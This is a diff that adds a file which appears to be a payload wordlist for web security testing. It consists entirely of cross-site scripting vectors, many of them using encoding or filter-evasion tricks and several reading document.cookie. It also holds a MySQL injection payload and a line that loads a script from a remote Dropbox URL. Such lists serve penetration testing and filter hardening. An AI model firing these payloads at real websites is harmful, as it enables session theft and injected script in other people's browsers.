@@ -1,0 +1,55 @@
+/<script>alert(1234)</script>
+//*><ScRipt>alert(/XSS/)</ScriPT>
+;</script><embed/test='asdf'/sr%00c='/'>
+/<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+/#<img src=1 onerror=javascript:confirm(3)>
+`'";//><Img Src=a OnError=location=src>
+//j%5c%5cjavascript%3aalert(document.domain)
+;})javascript:confirm(0);
+;javascript:confirm(0);
+/"/_javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x
+`"'><img src='#\x27 onerror=javascript:alert(1)>
+`'";//><img/src=x onError="${x};alert(`1`);">
+`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
+`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
+`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
+/"><img src=y onerror=confirm(1)>
+/*!50000and*/ /*!50000extractvalue*/(0x0a,/*!50000concat(0x0a,(select JSON_OBJECT(1, current_user())))*/)
+///%01javascript:alert(document.cookie)/
+/%09/javascript:alert(1)
+/%09/javascript:alert(1);
+/";%20confirm(1);%20//
+//%250Aalert?.(1)//
+/%2527)%253B%2520alert(document.cookies)%253B%252F%252F
+-(a=alert,b="_Y000!_",[b].find(a))-'
+-alert(1)-'
+/*alert(1)*/
+; alert(1);//
+;alert(123);
+-alert(1)-&apos;
+`-alert(1)">'onload="`<svg/1='
+-alert(23)/
+//";alert(String.fromCharCode(88,83,83))
+//?aspxerrorpath=<script>alert(1)</script>
+/* <audio src=1 onloadstart=alert&lpar;1&rpar;//> */
+;\"))}catch(e) {confirm(document.location);}//
+;\\"))}catch(e) {confirm(document.location);}//
+//comment%0a%0dalert(0);
+-(confirm)(document.domain)//
+/cpanelwebcall/<img src=x onerror="prompt(1)">aaaaaaaaaaaa
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
+//j\\javascript:alert(document.domain)
+/me/m%3C/script%3E%3Csvg/onload=prompt(document.domain)%3E
+/on<script>load=prompt(document.cookie);>
+`payload´; %3Cimg src='null' onerror=alert('spyerror')%3E
+;prompt(1)//”;prompt(2)//”;prompt(3)//–></SCRIPT>”>’><SCRIPT>prompt(4)</SCRIPT>
+//|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
+/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i
+/><script>window.alert('XSS Vulnerable');</script>
+-setTimeout`prompt\u0028document.domain\u0029`-'
+/<svg%0Aonauxclick=0;[1].some(confirm)//
+/*\"<sVg/oNloAd=alert(document.domain)//>\x3e
+/><svg src=x onload=confirm(document.domain);>
+-top['al\x65rt']('xss')-
+/?xss=500); alert(document.cookie);//
